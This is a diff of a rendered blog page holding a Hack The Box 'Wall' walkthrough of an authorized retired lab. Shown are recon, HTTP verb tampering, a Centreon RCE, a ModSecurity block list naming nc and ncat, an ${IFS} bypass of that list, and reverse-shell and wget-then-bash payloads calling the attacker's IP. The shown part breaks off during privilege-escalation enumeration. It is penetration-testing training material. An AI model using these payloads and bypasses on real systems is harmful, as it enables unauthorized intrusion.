@@ -1,18 +1,20 @@
 1:"$Sreact.fragment"
-2:I[8500,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],""]
-3:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],"ThemeToggle"]
-4:I[7549,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],"MobileNavigation"]
-f:I[8945,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],"ArticleReadingGuide"]
-11:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],"ThemeAutoReset"]
-13:I[484,[],"OutletBoundary"]
-14:"$Sreact.suspense"
-0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L2","/about",{"href":"/about","children":"About"}],["$","$L2","/projects",{"href":"/projects","children":"Projects"}],["$","$L2","/research",{"href":"/research","children":"Research"}],["$","$L2","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","$L2","/services",{"href":"/services","children":"Services"}],["$","$L2","/contact",{"href":"/contact","children":"Contact"}]]}],["$","$L3",null,{}],["$","$L2",null,{"className":"utility-link","href":"/contact#professional-enquiries","children":["Contact Abdullah ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L4",null,{"items":[{"label":"About","href":"/about"},{"label":"Projects","href":"/projects"},{"label":"Research","href":"/research"},{"label":"Writing","href":"/writing"},{"label":"Services","href":"/services"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","data-motion":"hero","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Wall Walkthrough"}],["$","p",null,{"className":"article-dek","children":"HTTP verb tampering exposed Centreon, API credential testing and a WAF-bypassed poller command yielded a www-data shell, decompiled Python bytecode revealed Shelby's SSH password, and a setuid Screen 4.5.0 exploit reached root."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-09T10:56:14.000Z","children":"9 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[17," minutes"]}]]}],null,["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-wall-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Wall machine avatar","loading":"lazy","decoding":"async","fetchPriority":"low"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Wall machine artwork, used for identification. Hack The Box is not affiliated with CyberKareem."}],["$","a",null,{"href":"https://www.hackthebox.com/machines/wall","target":"_blank","rel":"nofollow noopener noreferrer","children":["Official Hack The Box machine page"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","data-motion":"section","children":[["$","aside",null,{"className":"article-context","aria-label":"Article context","children":["$L5","$L6","$L7",["$L8","$L9"]]}],"$La"]}]]}],null,"$Lb"]}],"$Lc","$Ld"],null,"$Le"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"DK8DoHECLNCy57ryKFrJF"}
-5:["$","$Lf",null,{"headings":[{"id":"introduction-and-attack-overview","label":"Introduction & Attack Overview"},{"id":"step-1-reconnaissance-with-nmap","label":"Step 1: Reconnaissance with Nmap"},{"id":"step-2-web-enumeration","label":"Step 2: Web Enumeration"},{"id":"step-3-http-verb-tampering","label":"Step 3: HTTP Verb Tampering"},{"id":"step-4-centreon-discovery-and-credential-brute-force","label":"Step 4: Centreon Discovery & Credential Brute Force"},{"id":"step-5-centreon-rce-exploitation-cve-2019-13024","label":"Step 5: Centreon RCE Exploitation (CVE-2019-13024)"},{"id":"step-6-waf-bypass-and-reverse-shell","label":"Step 6: WAF Bypass & Reverse Shell"},{"id":"step-7-privilege-escalation-to-shelby","label":"Step 7: Privilege Escalation to shelby"},{"id":"step-8-privilege-escalation-to-root","label":"Step 8: Privilege Escalation to root"},{"id":"lessons","label":"Lessons"},{"id":"final-commands-cheat-sheet","label":"Final Commands Cheat Sheet"}]}]
-6:["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Source"}],[["$","p",null,{"children":"Technical source and supporting notes."}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/5a55dcf808566b21d48a147065fc621c807f703e/HTB-Wall.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision",["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","small",null,{"children":["CyberKareem/OSWE-Prep",", commit 5a55dcf80856",""]}]]]}]
-7:["$","div",null,{"className":"article-review-note article-review-lab-safety","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Wall, Linux, Medium",". Retirement verified ","12 Jul 2026","."," ","This walkthrough covers an authorized lab. Use these techniques only on systems you own or are explicitly authorized to test."]}],["$","a",null,{"href":"https://www.hackthebox.com/machines/wall","target":"_blank","rel":"nofollow noopener noreferrer","children":["View public machine page ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]
-8:["$","div","source-context-0",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"Source context"}],["$","p",null,{"children":"Based on Abdullah Kareem's public preparation notes and edited for clarity. Commands and technical claims remain tied to the documented lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}]
-9:["$","div","editorial-correction-1",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"6 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]
-10:T8b7d,<p><strong>Machine:</strong> Wall<br><strong>OS:</strong> Linux<br><strong>Difficulty:</strong> Medium<br><strong>Target IP:</strong> <code>10.129.2.9</code><br><strong>Attacker IP:</strong> <code>10.10.16.84</code><br><strong>User Flag:</strong> <code>eb1b6[redacted]32408</code><br><strong>Root Flag:</strong> <code>1fcad[redacted]814b40</code></p>
+2:I[8500,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],""]
+3:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],"ThemeToggle"]
+4:I[7549,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],"MobileNavigation"]
+11:I[8945,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],"ArticleReadingGuide"]
+13:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],"ThemeAutoReset"]
+15:I[484,[],"OutletBoundary"]
+16:"$Sreact.suspense"
+0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L2","/about",{"href":"/about","children":"About"}],["$","$L2","/projects",{"href":"/projects","children":"Projects"}],["$","$L2","/research",{"href":"/research","children":"Research"}],["$","$L2","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","$L2","/services",{"href":"/services","children":"Services"}],["$","$L2","/contact",{"href":"/contact","children":"Contact"}]]}],["$","$L3",null,{}],["$","$L2",null,{"className":"utility-link","href":"/contact#professional-enquiries","children":["Contact Abdullah ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L4",null,{"items":[{"label":"About","href":"/about"},{"label":"Projects","href":"/projects"},{"label":"Research","href":"/research"},{"label":"Writing","href":"/writing"},{"label":"Services","href":"/services"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","div",null,{"className":"article-hero-copy","data-motion":"hero","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Wall Walkthrough"}],["$","p",null,{"className":"article-dek","children":"HTTP verb tampering exposed Centreon, API credential testing and a WAF-bypassed poller command yielded a www-data shell, decompiled Python bytecode revealed Shelby's SSH password, and a setuid Screen 4.5.0 exploit reached root."}],["$","aside",null,{"className":"article-signal-deck article-signal-deck-htb","data-article-signal-kind":"lab","data-motion-surface":"instrument","aria-label":"Article orientation","children":[null,[["$","div",null,{"className":"article-signal-lab-node","aria-hidden":"true","children":[["$","span",null,{}],["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}]]}],["$","div",null,{"className":"article-signal-heading article-signal-lab-identity","children":[["$","span",null,{"children":"Authorized retired lab"}],"$L5","$L6","$L7"]}],"$L8","$L9"],null,null]}]]}],"$La"]}],"$Lb","$Lc"]}],null,"$Ld"]}],"$Le","$Lf"],null,"$L10"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"MVJfiMbnmqcLVn86bgJ_V"}
+5:["$","strong",null,{"children":"Wall"}]
+6:["$","small",null,{"children":"Hack The Box machine record"}]
+7:["$","a",null,{"className":"article-signal-source","href":"https://www.hackthebox.com/machines/wall","target":"_blank","rel":"nofollow noopener noreferrer","children":["Open public machine page"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]
+8:["$","dl",null,{"className":"article-signal-metrics article-signal-lab-metrics","children":[["$","div",null,{"className":"article-signal-metric","children":[["$","dt",null,{"children":"Operating system"}],["$","dd",null,{"children":"Linux"}]]}],["$","div",null,{"className":"article-signal-metric","children":[["$","dt",null,{"children":"Difficulty"}],["$","dd",null,{"children":"Medium"}]]}],["$","div",null,{"className":"article-signal-metric article-signal-metric-lab-state","children":[["$","dt",null,{"children":"Machine state"}],["$","dd",null,{"children":"Retired"}]]}],["$","div",null,{"className":"article-signal-metric","children":[["$","dt",null,{"children":"Retirement verified"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-07-12","children":"12 Jul 2026"}]}]]}]]}]
+9:["$","p",null,{"className":"article-signal-byline","children":["Published ","9 Jun 2026"," · ","Abdullah Kareem"]}]
+a:["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-wall-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Wall machine avatar","loading":"lazy","decoding":"async","fetchPriority":"low"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Wall machine artwork, used for identification. Hack The Box is not affiliated with CyberKareem."}],["$","a",null,{"href":"https://www.hackthebox.com/machines/wall","target":"_blank","rel":"nofollow noopener noreferrer","children":["Official Hack The Box machine page"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]
+b:["$","div",null,{"className":"article-rule"}]
+12:T9706,<p><strong>Machine:</strong> Wall<br><strong>OS:</strong> Linux<br><strong>Difficulty:</strong> Medium<br><strong>Target IP:</strong> <code>10.129.2.9</code><br><strong>Attacker IP:</strong> <code>10.10.16.84</code><br><strong>User Flag:</strong> <code>eb1b6[redacted]32408</code><br><strong>Root Flag:</strong> <code>1fcad[redacted]814b40</code></p>
 <hr>
 
 
@@ -27,7 +29,7 @@ f:I[8945,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app
 <li><strong>SUID Binary Exploitation:</strong> using misconfigured setuid binaries to escalate privileges.</li>
 </ul>
 <h3 id="the-complete-attack-chain">The Complete Attack Chain</h3>
-<pre><code>Nmap Scan → Gobuster → HTTP Verb Tampering → Centreon Login
+<pre tabindex="0" aria-label="Code or terminal block 1"><code>Nmap Scan → Gobuster → HTTP Verb Tampering → Centreon Login
     ↓
 Centreon RCE via CVE-2019-13024 (with WAF bypass)
     ↓
@@ -38,7 +40,7 @@ Exploit SUID screen-4.5.0 → ROOT
 <hr>
 <h2 id="step-1-reconnaissance-with-nmap">Step 1: Reconnaissance with Nmap</h2>
 
-<pre><code class="language-bash" data-language="bash">nmap -sC -sV -p- --min-rate 10000 -oN nmap_wall.txt 10.129.2.9
+<pre tabindex="0" aria-label="bash code or terminal block 2"><code class="language-bash" data-language="bash">nmap -sC -sV -p- --min-rate 10000 -oN nmap_wall.txt 10.129.2.9
 </code></pre>
 <h3 id="breaking-it-down-baby-steps">Breaking It Down (Baby Steps)</h3>
 <p>Understand every flag:</p>
@@ -81,7 +83,7 @@ Exploit SUID screen-4.5.0 → ROOT
 <p>Reconnaissance is the foundation of every successful penetration test. We're building a map of the target's attack surface. Every open port is a potential entry point. We scan all ports because experienced administrators and CTF creators often hide services on high ports.</p>
 
 <h3 id="results">Results</h3>
-<pre><code>PORT   STATE SERVICE VERSION
+<pre tabindex="0" aria-label="Code or terminal block 3"><code>PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
 80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
 </code></pre>
@@ -95,7 +97,7 @@ Exploit SUID screen-4.5.0 → ROOT
 <hr>
 <h2 id="step-2-web-enumeration">Step 2: Web Enumeration</h2>
 
-<pre><code class="language-bash" data-language="bash">gobuster dir -u http://10.129.2.9 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -t 40
+<pre tabindex="0" aria-label="bash code or terminal block 4"><code class="language-bash" data-language="bash">gobuster dir -u http://10.129.2.9 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -t 40
 </code></pre>
 <h3 id="breaking-it-down">Breaking It Down</h3>
 <table tabindex="0" aria-label="Breaking It Down data table">
@@ -131,7 +133,7 @@ Exploit SUID screen-4.5.0 → ROOT
 <p>When you see a default Apache page, the real application is usually accessible through a subdirectory or virtual host. Directory brute-forcing is how we discover these hidden paths. We're essentially guessing URLs that the developer didn't intend for users to find directly.</p>
 
 <h3 id="results-2">Results</h3>
-<pre><code>aa.php               (Status: 200) [Size: 1]
+<pre tabindex="0" aria-label="Code or terminal block 5"><code>aa.php               (Status: 200) [Size: 1]
 monitoring           (Status: 401) [Size: 457]
 panel.php            (Status: 200) [Size: 26]
 </code></pre>
@@ -147,7 +149,7 @@ panel.php            (Status: 200) [Size: 26]
 <h3 id="the-concept-important">The Concept (Important!)</h3>
 <p>HTTP supports multiple methods (verbs): <code>GET</code>, <code>POST</code>, <code>PUT</code>, <code>DELETE</code>, <code>HEAD</code>, <code>OPTIONS</code>, <code>TRACE</code>, <code>PATCH</code>, etc.</p>
 <p>Web servers can enforce access controls per method. A common misconfiguration is:</p>
-<pre><code class="language-apache" data-language="apache">&lt;Limit GET&gt;
+<pre tabindex="0" aria-label="apache code or terminal block 6"><code class="language-apache" data-language="apache">&lt;Limit GET&gt;
 require valid-user
 &lt;/Limit&gt;
 </code></pre>
@@ -156,14 +158,14 @@ require valid-user
 <p>Developers often think: "If someone visits this page in a browser, they need to log in." Browsers primarily use GET, so they only protect GET. They forget that scripts, APIs, and attackers can use other methods.</p>
 <h3 id="the-test">The Test</h3>
 <p>When we visit <code>/monitoring</code> in a browser (GET request), we see an authentication prompt:</p>
-<pre><code class="language-bash" data-language="bash">curl http://10.129.2.9/monitoring/
+<pre tabindex="0" aria-label="bash code or terminal block 7"><code class="language-bash" data-language="bash">curl http://10.129.2.9/monitoring/
 # Returns: 401 Unauthorized
 </code></pre>
 <p>But what if we send a POST request instead?</p>
-<pre><code class="language-bash" data-language="bash">curl -X POST http://10.129.2.9/monitoring/
+<pre tabindex="0" aria-label="bash code or terminal block 8"><code class="language-bash" data-language="bash">curl -X POST http://10.129.2.9/monitoring/
 </code></pre>
 <h3 id="the-result">The Result</h3>
-<pre><code class="language-html" data-language="html">&lt;h1&gt;This page is not ready yet !&lt;/h1&gt;
+<pre tabindex="0" aria-label="html code or terminal block 9"><code class="language-html" data-language="html">&lt;h1&gt;This page is not ready yet !&lt;/h1&gt;
 &lt;h2&gt;We should redirect you to the required page !&lt;/h2&gt;
 
 &lt;meta http-equiv="refresh" content="0; URL='/centreon'" /&gt;
@@ -191,27 +193,27 @@ require valid-user
 
 <h3 id="the-brute-force-problem">The Brute Force Problem</h3>
 <p>The Centreon web login form uses CSRF tokens:</p>
-<pre><code>POST /centreon/index.php HTTP/1.1
+<pre tabindex="0" aria-label="Code or terminal block 10"><code>POST /centreon/index.php HTTP/1.1
 ...
 useralias=admin&amp;password=REDACTED&amp;submitLogin=Connect&amp;centreon_token=REDACTED_HASH_OR_FLAG
 </code></pre>
 <p>Each page load generates a new token, making tools like Hydra difficult to use directly.</p>
 <h3 id="the-api-shortcut">The API Shortcut</h3>
 <p>Centreon provides an API endpoint that doesn't require CSRF tokens:</p>
-<pre><code>POST /centreon/api/index.php?action=authenticate
+<pre tabindex="0" aria-label="Code or terminal block 11"><code>POST /centreon/api/index.php?action=authenticate
 </code></pre>
 <p>With parameters:</p>
-<pre><code>username=admin&amp;password=PASSWORD
+<pre tabindex="0" aria-label="Code or terminal block 12"><code>username=admin&amp;password=PASSWORD
 </code></pre>
 <p>If credentials are wrong, it returns <code>"Bad credentials"</code>.<br>If correct, it returns a JSON auth token:</p>
-<pre><code class="language-json" data-language="json">{"authToken":"O+ESx+W7OFxogUkxmREJylhO4FjUMaCVDQHKx\/pVrpI="}
+<pre tabindex="0" aria-label="json code or terminal block 13"><code class="language-json" data-language="json">{"authToken":"O+ESx+W7OFxogUkxmREJylhO4FjUMaCVDQHKx\/pVrpI="}
 </code></pre>
 <h3 id="testing-the-known-credentials">Testing the Known Credentials</h3>
-<pre><code class="language-bash" data-language="bash">curl -s http://10.129.2.9/centreon/api/index.php?action=authenticate \
+<pre tabindex="0" aria-label="bash code or terminal block 14"><code class="language-bash" data-language="bash">curl -s http://10.129.2.9/centreon/api/index.php?action=authenticate \
   -d "username=admin&amp;password=REDACTED"
 </code></pre>
 <p><strong>Result:</strong></p>
-<pre><code class="language-json" data-language="json">{"authToken":"O+ESx+W7OFxogUkxmREJylhO4FjUMaCVDQHKx\/pVrpI="}
+<pre tabindex="0" aria-label="json code or terminal block 15"><code class="language-json" data-language="json">{"authToken":"O+ESx+W7OFxogUkxmREJylhO4FjUMaCVDQHKx\/pVrpI="}
 </code></pre>
 
 <blockquote>
@@ -236,7 +238,7 @@ useralias=admin&amp;password=REDACTED&amp;submitLogin=Connect&amp;centreon_token
 </ol>
 <h3 id="building-the-exploit-script">Building the Exploit Script</h3>
 <p>Rather than clicking through the browser every time, we automate with Python. Here's the script we created:</p>
-<pre><code class="language-python" data-language="python">#!/usr/bin/env python3
+<pre tabindex="0" aria-label="python code or terminal block 16"><code class="language-python" data-language="python">#!/usr/bin/env python3
 import re
 import requests
 import sys
@@ -340,10 +342,10 @@ except Exception as e:
 <li><strong>Trigger:</strong> Calls <code>generateFiles.php</code> to execute the payload</li>
 </ol>
 <h3 id="testing-with-id">Testing with <code>id</code></h3>
-<pre><code class="language-bash" data-language="bash">python3 centreon-exploit.py http://10.129.2.9/centreon/ admin password1 "id"
+<pre tabindex="0" aria-label="bash code or terminal block 17"><code class="language-bash" data-language="bash">python3 centreon-exploit.py http://10.129.2.9/centreon/ admin password1 "id"
 </code></pre>
 <p><strong>Result:</strong></p>
-<pre><code>uid=33(www-data) gid=33(www-data) groups=33(www-data),6000(centreon)
+<pre tabindex="0" aria-label="Code or terminal block 18"><code>uid=33(www-data) gid=33(www-data) groups=33(www-data),6000(centreon)
 </code></pre>
 
 <blockquote>
@@ -354,12 +356,12 @@ except Exception as e:
 <h2 id="step-6-waf-bypass-and-reverse-shell">Step 6: WAF Bypass &amp; Reverse Shell</h2>
 <h3 id="discovering-the-waf">Discovering the WAF</h3>
 <p>Initially, you might try a simple reverse shell:</p>
-<pre><code class="language-bash" data-language="bash">ncat -e /bin/bash 10.10.16.84 443
+<pre tabindex="0" aria-label="bash code or terminal block 19"><code class="language-bash" data-language="bash">ncat -e /bin/bash 10.10.16.84 443
 </code></pre>
 <p>But the exploit returns <strong>HTTP 403 Forbidden</strong>. Something is blocking us.</p>
 <h3 id="waf-analysis">WAF Analysis</h3>
 <p>The Wall box runs <strong>ModSecurity</strong> with custom rules in <code>/etc/modsecurity/modsecurity.conf</code>:</p>
-<pre><code># block nc word
+<pre tabindex="0" aria-label="Code or terminal block 20"><code># block nc word
 SecRule REQUEST_BODY "\bnc\b" "id:00001,deny,msg:'blocked'"
 
 # block ncat word
@@ -390,7 +392,7 @@ SecRule REQUEST_BODY "\bhostname\b" "id:00006,deny,msg:'blocked'"
 <h3 id="the-bypass-ifs">The Bypass: <code>${IFS}</code></h3>
 <p>Bash has a built-in variable called <strong><code>IFS</code></strong> (Internal Field Separator). By default, it contains whitespace characters (space, tab, newline). We can reference it as <code>${IFS}</code> to insert a space-like separator <strong>without using an actual space character</strong>.</p>
 <p>Example:</p>
-<pre><code class="language-bash" data-language="bash"># Blocked by WAF:
+<pre tabindex="0" aria-label="bash code or terminal block 21"><code class="language-bash" data-language="bash"># Blocked by WAF:
 nc -e /bin/bash 10.10.16.84 443
 
 # Bypassed:
@@ -412,7 +414,7 @@ nc${IFS}-e${IFS}/bin/bash${IFS}10.10.16.84${IFS}443
 <h3 id="setting-up-the-reverse-shell">Setting Up the Reverse Shell</h3>
 <p>We use a <strong>staged approach</strong>: download a shell script from our Kali machine, then execute it.</p>
 <p><strong>Step 1:</strong> Create the shell script on Kali:</p>
-<pre><code class="language-bash" data-language="bash">cd ~/Downloads/htb
+<pre tabindex="0" aria-label="bash code or terminal block 22"><code class="language-bash" data-language="bash">cd ~/Downloads/htb
 cat &gt; shell &lt;&lt; 'EOF'
 #!/bin/bash
 bash -i &gt;&amp; /dev/tcp/10.10.16.84/443 0&gt;&amp;1
@@ -425,20 +427,20 @@ EOF
 <li><code>0&gt;&amp;1</code> redirects stdin from the same connection</li>
 </ul>
 <p><strong>Step 2:</strong> Start a Python HTTP server to serve the script:</p>
-<pre><code class="language-bash" data-language="bash">python3 -m http.server 80
+<pre tabindex="0" aria-label="bash code or terminal block 23"><code class="language-bash" data-language="bash">python3 -m http.server 80
 </code></pre>
 <p><strong>Step 3:</strong> Start a netcat listener:</p>
-<pre><code class="language-bash" data-language="bash">nc -lnvp 443
+<pre tabindex="0" aria-label="bash code or terminal block 24"><code class="language-bash" data-language="bash">nc -lnvp 443
 </code></pre>
 <p><strong>Step 4:</strong> Trigger the download and execution:</p>
-<pre><code class="language-bash" data-language="bash">python3 centreon-exploit.py http://10.129.2.9/centreon/ admin password1 \
+<pre tabindex="0" aria-label="bash code or terminal block 25"><code class="language-bash" data-language="bash">python3 centreon-exploit.py http://10.129.2.9/centreon/ admin password1 \
   'wget${IFS}http://10.10.16.84/shell${IFS}-O${IFS}/tmp/yakuhito;${IFS}bash${IFS}/tmp/yakuhito'
 </code></pre>
 <h3 id="payload-breakdown">Payload Breakdown</h3>
-<pre><code>wget${IFS}http://10.10.16.84/shell${IFS}-O${IFS}/tmp/yakuhito;${IFS}bash${IFS}/tmp/yakuhito
+<pre tabindex="0" aria-label="Code or terminal block 26"><code>wget${IFS}http://10.10.16.84/shell${IFS}-O${IFS}/tmp/yakuhito;${IFS}bash${IFS}/tmp/yakuhito
 </code></pre>
 <p>With spaces restored, this is:</p>
-<pre><code class="language-bash" data-language="bash">wget http://10.10.16.84/shell -O /tmp/yakuhito; bash /tmp/yakuhito
+<pre tabindex="0" aria-label="bash code or terminal block 27"><code class="language-bash" data-language="bash">wget http://10.10.16.84/shell -O /tmp/yakuhito; bash /tmp/yakuhito
 </code></pre>
 <ul>
 <li><code>wget</code> downloads our shell script</li>
@@ -448,7 +450,7 @@ EOF
 </ul>
 
 <p>On our netcat listener:</p>
-<pre><code>connect to [10.10.16.84] from (UNKNOWN) [10.129.2.9] 56734
+<pre tabindex="0" aria-label="Code or terminal block 28"><code>connect to [10.10.16.84] from (UNKNOWN) [10.129.2.9] 56734
 bash: cannot set terminal process group (1241): Inappropriate ioctl for device
 bash: no job control in this shell
 www-data@Wall:/usr/local/centreon/www$ id
@@ -457,7 +459,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data),6000(centreon)
 <p>We now have a shell as <code>www-data</code>.</p>
 <h3 id="stabilizing-the-shell-optional-but-recommended">Stabilizing the Shell (Optional but Recommended)</h3>
 <p>For a more stable shell, run:</p>
-<pre><code class="language-bash" data-language="bash">python3 -c 'import pty; pty.spawn("/bin/bash")'
+<pre tabindex="0" aria-label="bash code or terminal block 29"><code class="language-bash" data-language="bash">python3 -c 'import pty; pty.spawn("/bin/bash")'
 # Then press Ctrl+Z to background
 # On Kali:
 stty raw -echo; fg
@@ -468,7 +470,7 @@ export TERM=xterm
 <h2 id="step-7-privilege-escalation-to-shelby">Step 7: Privilege Escalation to <code>shelby</code></h2>
 <h3 id="enumeration-as-www-data">Enumeration as <code>www-data</code></h3>
 <p>With our initial shell, we start looking for privilege escalation paths:</p>
-<pre><code class="language-bash" data-language="bash"># Look for interesting files in /opt
+<pre tabindex="0" aria-label="bash code or terminal block 30"><code class="language-bash" data-language="bash"># Look for interesting files in /opt
 ls -la /opt/
 
 # Look for SUID binaries
@@ -482,20 +484,20 @@ sudo -l
 </code></pre>
 <h3 id="discovery">Discovery</h3>
 <p>In <code>/opt/</code>, we find a hidden directory:</p>
-<pre><code class="language-bash" data-language="bash">www-data@Wall:/$ ls -la /opt/
